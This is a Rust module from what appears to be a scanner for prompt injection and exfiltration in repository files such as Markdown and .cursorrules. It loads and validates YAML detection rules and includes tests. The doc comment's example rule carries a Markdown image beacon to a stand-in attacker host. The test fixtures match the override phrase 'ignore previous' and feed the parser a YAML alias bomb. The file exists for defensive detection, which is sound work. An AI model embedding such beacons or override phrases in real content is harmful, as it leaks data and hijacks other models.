//! Rule files: schema, loading and validation.
//!
//! A rule is one YAML file, `rules/<category>/<slug>.yaml`:
//!
//! ```yaml
//! id: exfiltration/markdown-image-beacon   # must equal <category>/<file stem>
//! severity: high                           # info | low | medium | high | critical
//! title: Markdown image with a query string to an external host
//! description: >
//!   Why this matters.
//! applies_to: ["**/*.md", ".cursorrules"]  # globs on the path relative to the root
//! exclude: ["**/CHANGELOG.md"]             # optional
//! detect:
//!   markdown_image_url: { require_query: true }
//! remediation: What to do instead.
//! references: ["https://..."]              # optional
//! tags: [prompt-injection]                 # optional
//! examples:
//!   match:
//!     - "![x](https://attacker.example/p.png?d=1)"
//!     - path: docs/a.md                    # object form for path-sensitive rules
//!       content: "..."
//!   nomatch:
//!     - "![logo](./logo.png)"
//! ```
//!
//! Unknown keys are errors. Validation checks that the id is well formed
//! (and matches the file location when loaded from a directory), that there
//! is at least one `match` and one `nomatch` example, that globs and regexes
//! compile and that the detector is well formed. A plain-string example is
//! scanned as `example` plus the first extension found in `applies_to`
//! (`example.md` when there is none).
//!
//! Globs match the path relative to the scan root with `/` separators; `*`
//! does not cross `/`, `**` does. A glob without `/` matches the file name
//! at any depth (`X` is treated as `**/X`).

use std::fmt;
use std::fs;
use std::path::{Path, PathBuf};

use globset::{GlobBuilder, GlobSet, GlobSetBuilder};
use serde::Deserialize;

use crate::detect::{DetectSpec, Detector};
use crate::report::Severity;

/// Rule files larger than this are refused.
const MAX_RULE_BYTES: usize = 256 * 1024;

/// Directories are searched at most this deep for rule files.
const MAX_RULE_DIR_DEPTH: usize = 4;

/// A rule that failed to load.
#[derive(Debug, thiserror::Error)]
pub enum RuleError {
    /// The file parsed but is not a valid rule, or did not parse.
    #[error("{origin}: {message}")]
    Invalid {
        /// File path, or `builtin:<path>` for embedded rules.
        origin: String,
        /// Why.
        message: String,
    },
    /// The file or directory could not be read.
    #[error("{origin}: cannot read: {source}")]
    Io {
        /// The path.
        origin: String,
        /// The I/O error.
        #[source]
        source: std::io::Error,
    },
    /// Two rules share an id.
    #[error("duplicate rule id `{id}` in {first} and {second}")]
    Duplicate {
        /// The id.
        id: String,
        /// Where it was first defined.
        first: String,
        /// Where it was defined again.
        second: String,
    },
}

impl RuleError {
    fn invalid(origin: &str, message: impl Into<String>) -> Self {
        RuleError::Invalid {
            origin: origin.to_owned(),
            message: message.into(),
        }
    }
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RuleDoc {
    id: String,
    severity: Severity,
    title: String,
    description: String,
    applies_to: Vec<String>,
    #[serde(default)]
    exclude: Vec<String>,
    detect: DetectSpec,
    remediation: String,
    #[serde(default)]
    references: Vec<String>,
    #[serde(default)]
    tags: Vec<String>,
    examples: ExamplesDoc,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct ExamplesDoc {
    #[serde(rename = "match", default)]
    matches: Vec<ExampleDoc>,
    #[serde(default)]
    nomatch: Vec<ExampleDoc>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum ExampleDoc {
    Text(String),
    File(ExampleFile),
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct ExampleFile {
    path: String,
    content: String,
}

/// An inline example: a file path and its content.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Example {
    /// Path relative to an imaginary scan root.
    pub path: String,
    /// File content.
    pub content: String,
}

/// A rule's inline examples.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Examples {
    /// Each must produce at least one finding.
    pub matches: Vec<Example>,
    /// Each must produce no finding.
    pub nomatch: Vec<Example>,
}

/// A validated, compiled rule.
pub struct Rule {
    id: String,
    severity: Severity,
    title: String,
    description: String,
    applies_to: Vec<String>,
    exclude: Vec<String>,
    remediation: String,
    references: Vec<String>,
    tags: Vec<String>,
    examples: Examples,
    origin: String,
    detector: Detector,
    applies: GlobSet,
    excludes: GlobSet,
}

impl fmt::Debug for Rule {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("Rule")
            .field("id", &self.id)
            .field("severity", &self.severity)
            .field("origin", &self.origin)
            .field("detector", &self.detector)
            .finish_non_exhaustive()
    }
}

impl Rule {
    /// Parse and validate one rule. `origin` names it in errors (a path, or
    /// `builtin:<path>`). When `expected_id` is given the rule's id must
    /// equal it; directory loading passes `<dir>/<file stem>`.
    pub fn from_yaml(
        text: &str,
        origin: &str,
        expected_id: Option<&str>,
    ) -> Result<Rule, RuleError> {
        if text.len() > MAX_RULE_BYTES {
            return Err(RuleError::invalid(
                origin,
                format!("rule file is larger than {MAX_RULE_BYTES} bytes"),
            ));
        }
        let doc: RuleDoc =
            serde_saphyr::from_str_with_options(text, crate::detect::structured::yaml_options())
                .map_err(|e| RuleError::invalid(origin, e.to_string()))?;
        Self::from_doc(doc, origin, expected_id).map_err(|m| RuleError::invalid(origin, m))
    }

    fn from_doc(doc: RuleDoc, origin: &str, expected_id: Option<&str>) -> Result<Rule, String> {
        validate_id(&doc.id)?;
        if let Some(expected) = expected_id {
            if doc.id != expected {
                return Err(format!(
                    "id `{}` does not match the file location (expected `{expected}`)",
                    doc.id
                ));
            }
        }
        let title = doc.title.trim();
        if title.is_empty() || title.contains('\n') || title.chars().count() > 120 {
            return Err("title must be one non-empty line of at most 120 characters".into());
        }
        if doc.description.trim().is_empty() {
            return Err("description must not be empty".into());
        }
        if doc.remediation.trim().is_empty() {
            return Err("remediation must not be empty".into());
        }
        for r in &doc.references {
            if !(r.starts_with("https://") || r.starts_with("http://")) {
                return Err(format!("reference `{r}` must be an http(s) URL"));
            }
        }
        for t in &doc.tags {
            if t.is_empty()
                || !t
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
            {
                return Err(format!(
                    "tag `{t}` must be lowercase letters, digits and `-`"
                ));
            }
        }
        if doc.applies_to.is_empty() {
            return Err("applies_to must list at least one glob".into());
        }
        let applies = glob_set(&doc.applies_to, "applies_to")?;
        let excludes = glob_set(&doc.exclude, "exclude")?;
        if doc.examples.matches.is_empty() {
            return Err("examples.match needs at least one example".into());
        }
        if doc.examples.nomatch.is_empty() {
            return Err("examples.nomatch needs at least one example".into());
        }
        let default_path = default_example_path(&doc.applies_to);
        let convert = |list: Vec<ExampleDoc>| -> Result<Vec<Example>, String> {
            list.into_iter()
                .map(|e| match e {
                    ExampleDoc::Text(content) => Ok(Example {
                        path: default_path.clone(),
                        content,
                    }),
                    ExampleDoc::File(f) => {
                        validate_example_path(&f.path)?;
                        Ok(Example {
                            path: f.path,
                            content: f.content,
                        })
                    }
                })
                .collect()
        };
        let examples = Examples {
            matches: convert(doc.examples.matches)?,
            nomatch: convert(doc.examples.nomatch)?,
        };
        let detector = doc.detect.compile()?;
        Ok(Rule {
            id: doc.id,
            severity: doc.severity,
            title: title.to_owned(),
            description: doc.description.trim().to_owned(),
            applies_to: doc.applies_to,
            exclude: doc.exclude,
            remediation: doc.remediation.trim().to_owned(),
            references: doc.references,
            tags: doc.tags,
            examples,
            origin: origin.to_owned(),
            detector,
            applies,
            excludes,
        })
    }

    /// `category/slug`.
    pub fn id(&self) -> &str {
        &self.id
    }

    /// Severity of every finding of this rule.
    pub fn severity(&self) -> Severity {
        self.severity
    }

    /// One-line title.
    pub fn title(&self) -> &str {
        &self.title
    }

    /// Why it matters.
    pub fn description(&self) -> &str {
        &self.description
    }

    /// What to do instead.
    pub fn remediation(&self) -> &str {
        &self.remediation
    }

    /// Further reading.
    pub fn references(&self) -> &[String] {
        &self.references
    }

    /// Tags, copied to SARIF.
    pub fn tags(&self) -> &[String] {
        &self.tags
    }

    /// The globs as written.
    pub fn applies_to(&self) -> &[String] {
        &self.applies_to
    }

    /// The exclude globs as written.
    pub fn exclude(&self) -> &[String] {
        &self.exclude
    }

    /// Inline examples.
    pub fn examples(&self) -> &Examples {
        &self.examples
    }

    /// Where the rule came from (file path or `builtin:<path>`).
    pub fn origin(&self) -> &str {
        &self.origin
    }

    /// Does this rule look at a file with this relative path?
    pub fn applies_to_path(&self, rel_path: &str) -> bool {
        self.applies.is_match(rel_path) && !self.excludes.is_match(rel_path)
    }

    pub(crate) fn detector(&self) -> &Detector {
        &self.detector
    }
}

fn validate_id(id: &str) -> Result<(), String> {
    let part = |s: &str| {
        !s.is_empty()
            && !s.starts_with('-')
            && !s.ends_with('-')
            && !s.contains("--")
            && s.chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
    };
    match id.split_once('/') {
        Some((category, slug)) if part(category) && part(slug) => Ok(()),
        _ => Err(format!(
            "id `{id}` must be `category/slug` in lowercase letters, digits and single dashes"
        )),
    }
}

fn validate_example_path(path: &str) -> Result<(), String> {
    let ok = !path.is_empty()
        && !path.starts_with('/')
        && !path.contains('\\')
        && path
            .split('/')
            .all(|c| !c.is_empty() && c != "." && c != "..");
    if ok {
        Ok(())
    } else {
        Err(format!(
            "example path `{path}` must be relative, `/`-separated, without `.` or `..`"
        ))
    }
}

/// Compile globs the scanner's way: `*` does not cross `/`, and a glob with
/// no `/` matches the file name at any depth.
fn glob_set(globs: &[String], field: &str) -> Result<GlobSet, String> {
    let mut builder = GlobSetBuilder::new();
    for raw in globs {
        if raw.is_empty() || raw.starts_with('/') || raw.contains('\\') {
            return Err(format!(
                "{field}: `{raw}` must be a non-empty relative glob with `/` separators"
            ));
        }
        let pattern = if raw.contains('/') {
            raw.clone()
        } else {
            format!("**/{raw}")
        };
        let glob = GlobBuilder::new(&pattern)
            .literal_separator(true)
            .backslash_escape(true)
            .build()
            .map_err(|e| format!("{field}: `{raw}`: {e}"))?;
        builder.add(glob);
    }
    builder.build().map_err(|e| format!("{field}: {e}"))
}

/// `example` + the first extension found in `applies_to`, else `example.md`.
fn default_example_path(applies_to: &[String]) -> String {
    for glob in applies_to {
        let name = glob.rsplit('/').next().unwrap_or(glob);
        let Some((stem, ext)) = name.rsplit_once('.') else {
            continue;
        };
        if stem.is_empty() {
            // `.cursorrules`: a dotfile, not an extension.
            continue;
        }
        let ext = ext
            .strip_prefix('{')
            .and_then(|e| e.strip_suffix('}'))
            .map_or(ext, |alts| alts.split(',').next().unwrap_or(alts));
        if !ext.is_empty() && ext.chars().all(|c| c.is_ascii_alphanumeric()) {
            return format!("example.{ext}");
        }
    }
    "example.md".to_owned()
}

/// Check that no two rules share an id.
pub fn check_unique(rules: &[Rule]) -> Result<(), RuleError> {
    let mut seen: std::collections::HashMap<&str, &str> = std::collections::HashMap::new();
    for rule in rules {
        if let Some(first) = seen.insert(rule.id(), rule.origin()) {
            return Err(RuleError::Duplicate {
                id: rule.id().to_owned(),
                first: first.to_owned(),
                second: rule.origin().to_owned(),
            });
        }
    }
    Ok(())
}

/// Load every `*.yaml` rule under `dir`. A file's id must be `<parent
/// directory name>/<file stem>`, so `rules/` and `rules/<category>/` both
/// work. Symlinks are refused rather than followed, `.yml` files are an
/// error (one extension avoids silently ignored rules), and other files
/// (README.md) are ignored. Order is deterministic.
pub fn load_dir(dir: &Path) -> Result<Vec<Rule>, RuleError> {
    let mut files = Vec::new();
    collect_rule_files(dir, 0, &mut files)?;
    files.sort();
    let mut rules = Vec::with_capacity(files.len());
    for path in files {
        let origin = path.display().to_string();
        let parent = path
            .parent()
            .and_then(Path::file_name)
            .and_then(|n| n.to_str())
            .ok_or_else(|| {
                RuleError::invalid(&origin, "cannot determine the category directory")
            })?;
        let stem = path
            .file_stem()
            .and_then(|s| s.to_str())
            .ok_or_else(|| RuleError::invalid(&origin, "file name is not valid UTF-8"))?;
        let expected = format!("{parent}/{stem}");
        let text = fs::read_to_string(&path).map_err(|source| RuleError::Io {
            origin: origin.clone(),
            source,
        })?;
        rules.push(Rule::from_yaml(&text, &origin, Some(&expected))?);
    }
    check_unique(&rules)?;
    Ok(rules)
}

fn collect_rule_files(dir: &Path, depth: usize, out: &mut Vec<PathBuf>) -> Result<(), RuleError> {
    let io = |source| RuleError::Io {
        origin: dir.display().to_string(),
        source,
    };
    let meta = fs::symlink_metadata(dir).map_err(io)?;
    if meta.file_type().is_symlink() {
        return Err(RuleError::invalid(
            &dir.display().to_string(),
            "symlinks are not followed in rule directories",
        ));
    }
    if !meta.is_dir() {
        return Err(RuleError::invalid(
            &dir.display().to_string(),
            "not a directory",
        ));
    }
    for entry in fs::read_dir(dir).map_err(io)? {
        let entry = entry.map_err(io)?;
        let path = entry.path();
        let origin = path.display().to_string();
        let ft = entry.file_type().map_err(|source| RuleError::Io {
            origin: origin.clone(),
            source,
        })?;
        let ext = path.extension().and_then(|e| e.to_str());
        if ft.is_symlink() {
            // A symlinked rule or category would otherwise vanish silently.
            let to_dir = fs::metadata(&path).is_ok_and(|m| m.is_dir());
            if to_dir || matches!(ext, Some("yaml" | "yml")) {
                return Err(RuleError::invalid(
                    &origin,
                    "symlinks are not followed in rule directories",
                ));
            }
        } else if ft.is_dir() {
            if depth + 1 < MAX_RULE_DIR_DEPTH {
                collect_rule_files(&path, depth + 1, out)?;
            }
        } else if ext == Some("yaml") {
            out.push(path);
        } else if ext == Some("yml") {
            return Err(RuleError::invalid(
                &origin,
                "rule files must use the .yaml extension",
            ));
        }
    }
    Ok(())
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::fmt::Write as _;

    pub(crate) const GOOD: &str = r#"
id: test/sample-rule
severity: high
title: A sample rule
description: >
  Exists for tests.
applies_to: ["**/*.md", ".cursorrules"]
exclude: ["**/CHANGELOG.md"]
detect:
  regex: 'ignore previous'
remediation: Remove it.
references: ["https://example.com/ref"]
tags: [prompt-injection]
examples:
  match:
    - "please ignore previous"
    - path: .cursorrules
      content: "ignore previous"
  nomatch:
    - "hello"
    - path: CHANGELOG.md
      content: "ignore previous"
"#;

    fn load(text: &str) -> Result<Rule, RuleError> {
        Rule::from_yaml(text, "test.yaml", None)
    }

    fn error(text: &str) -> String {
        load(text).unwrap_err().to_string()
    }

    #[test]
    fn good_rule_loads() {
        let r = load(GOOD).unwrap();
        assert_eq!(r.id(), "test/sample-rule");
        assert_eq!(r.severity(), Severity::High);
        assert_eq!(r.examples().matches[0].path, "example.md");
        assert_eq!(r.examples().matches[1].path, ".cursorrules");
        assert_eq!(r.tags(), ["prompt-injection"]);
        assert!(r.applies_to_path("README.md"));
        assert!(r.applies_to_path("docs/deep/x.md"));
        assert!(r.applies_to_path(".cursorrules"));
        assert!(r.applies_to_path("sub/.cursorrules"));
        assert!(!r.applies_to_path("CHANGELOG.md"));
        assert!(!r.applies_to_path("docs/CHANGELOG.md"));
        assert!(!r.applies_to_path("x.txt"));
        assert!(format!("{r:?}").contains("test/sample-rule"));
    }

    #[test]
    fn unknown_keys_are_errors() {
        let e = error(&GOOD.replace("tags:", "tagz:"));
        assert!(e.contains("tagz"), "{e}");
        let with_extra = GOOD.replace(
            "    - path: CHANGELOG.md\n",
            "    - path: CHANGELOG.md\n      extra: 1\n",
        );
        assert_ne!(with_extra, GOOD);
        assert!(load(&with_extra).is_err());
    }

    #[test]
    fn id_rules() {
        for bad in [
            "noslash", "a/b/c", "A/b", "a/-b", "a/b-", "a//b", "a/b--c", "/b", "a/",
        ] {
            let e = error(&GOOD.replace("test/sample-rule", bad));
            assert!(e.contains("must be `category/slug`"), "{bad}: {e}");
        }
        let e = Rule::from_yaml(GOOD, "x", Some("test/other"))
            .unwrap_err()
            .to_string();
        assert!(e.contains("does not match the file location"), "{e}");
    }

    #[test]
    fn severity_must_be_known() {
        let e = error(&GOOD.replace("severity: high", "severity: severe"));
        assert!(e.contains("severe"), "{e}");
    }

    #[test]
    fn examples_are_required() {
        let no_nomatch = GOOD.split("  nomatch:").next().unwrap();
        assert!(error(no_nomatch).contains("examples.nomatch"));
        let no_match = GOOD.replace(
            "  match:\n    - \"please ignore previous\"\n    - path: .cursorrules\n      content: \"ignore previous\"\n",
            "",
        );
        assert!(
            error(&no_match).contains("examples.match"),
            "{}",
            error(&no_match)
        );
    }

    #[test]
    fn example_paths_are_checked() {
        let e = error(&GOOD.replace("path: .cursorrules", "path: ../escape.md"));
        assert!(e.contains("example path"), "{e}");
        let e = error(&GOOD.replace("path: .cursorrules", "path: /abs.md"));
        assert!(e.contains("example path"), "{e}");
    }

    #[test]
    fn globs_and_regexes_must_compile() {
        let e = error(&GOOD.replace("\"**/*.md\"", "\"**/[.md\""));
        assert!(e.contains("applies_to"), "{e}");
        let e = error(&GOOD.replace("\"**/*.md\"", "\"/abs/*.md\""));
        assert!(e.contains("relative glob"), "{e}");
        let e = error(&GOOD.replace("'ignore previous'", "'('"));
        assert!(e.contains("detect.regex"), "{e}");
        let e = error(&GOOD.replace(
            "applies_to: [\"**/*.md\", \".cursorrules\"]",
            "applies_to: []",
        ));
        assert!(e.contains("applies_to"), "{e}");
    }

    #[test]
    fn text_fields_are_checked() {
        assert!(error(&GOOD.replace("title: A sample rule", "title: \"\"")).contains("title"));
        assert!(
            error(&GOOD.replace("remediation: Remove it.", "remediation: \" \""))
                .contains("remediation")
        );
        assert!(error(&GOOD.replace("https://example.com/ref", "ftp://x")).contains("reference"));
        assert!(error(&GOOD.replace("[prompt-injection]", "[Prompt]")).contains("tag"));
    }

    #[test]
    fn hostile_rule_yaml_is_an_error_not_a_crash() {
        assert!(load("").is_err());
        assert!(load("[").is_err());
        assert!(load(&"[".repeat(10_000)).is_err());
        // 500 levels: deep, but small enough to reach the parser.
        let mut block = String::new();
        for i in 0..500 {
            block.push_str(&" ".repeat(i));
            block.push_str("a:\n");
        }
        assert!(block.len() < MAX_RULE_BYTES);
        let e = load(&block).unwrap_err().to_string();
        assert!(e.to_lowercase().contains("depth"), "{e}");
        assert!(load(&"x".repeat(MAX_RULE_BYTES + 1))
            .unwrap_err()
            .to_string()
            .contains("larger"));
        let mut bomb = String::from("a: &a [x,x,x,x,x,x,x,x,x,x]\n");
        for (prev, name) in ["a", "b", "c", "d", "e", "f", "g"]
            .windows(2)
            .map(|w| (w[0], w[1]))
        {
            let refs = vec![format!("*{prev}"); 10].join(",");
            let _ = writeln!(bomb, "{name}: &{name} [{refs}]");
        }
        assert!(load(&bomb).is_err());
    }

    #[test]
    fn default_example_paths() {
        let p = |globs: &[&str]| {
            default_example_path(&globs.iter().map(|s| (*s).to_owned()).collect::<Vec<_>>())
        };
        assert_eq!(p(&["**/*.md"]), "example.md");
        assert_eq!(p(&[".cursorrules", "**/*.mdc"]), "example.mdc");
        assert_eq!(p(&[".github/workflows/*.{yml,yaml}"]), "example.yml");
        assert_eq!(p(&["**/SKILL.md"]), "example.md");
        assert_eq!(p(&[".cursorrules"]), "example.md");
        assert_eq!(p(&["**/*"]), "example.md");
    }

    #[test]
    fn duplicates_are_reported() {
        let a = load(GOOD).unwrap();
        let b = Rule::from_yaml(GOOD, "other.yaml", None).unwrap();
        let e = check_unique(&[a, b]).unwrap_err().to_string();
        assert!(e.contains("duplicate rule id `test/sample-rule`"), "{e}");
        assert!(e.contains("test.yaml") && e.contains("other.yaml"), "{e}");
    }

    #[test]
    fn load_dir_checks_location_and_extensions() {
        let tmp = tempfile::tempdir().unwrap();
        let cat = tmp.path().join("test");
        fs::create_dir(&cat).unwrap();
        fs::write(cat.join("sample-rule.yaml"), GOOD).unwrap();
        fs::write(tmp.path().join("README.md"), "ignored").unwrap();
        let rules = load_dir(tmp.path()).unwrap();
        assert_eq!(rules.len(), 1);
        // The category directory itself also works.
        assert_eq!(load_dir(&cat).unwrap().len(), 1);

        fs::write(cat.join("misplaced.yaml"), GOOD).unwrap();
        let e = load_dir(tmp.path()).unwrap_err().to_string();
        assert!(
            e.contains("misplaced.yaml") && e.contains("does not match"),
            "{e}"
        );
        fs::remove_file(cat.join("misplaced.yaml")).unwrap();

        fs::write(cat.join("other.yml"), GOOD).unwrap();
        let e = load_dir(tmp.path()).unwrap_err().to_string();
        assert!(e.contains(".yaml extension"), "{e}");
        fs::remove_file(cat.join("other.yml")).unwrap();

        assert!(load_dir(&tmp.path().join("missing")).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn load_dir_refuses_symlinks() {
        let tmp = tempfile::tempdir().unwrap();
        let cat = tmp.path().join("test");
        fs::create_dir(&cat).unwrap();
        let real = tmp.path().join("real.yaml");
        fs::write(&real, GOOD).unwrap();
        std::os::unix::fs::symlink(&real, cat.join("sample-rule.yaml")).unwrap();
        let e = load_dir(&cat).unwrap_err().to_string();
        assert!(e.contains("symlinks are not followed"), "{e}");
    }
}
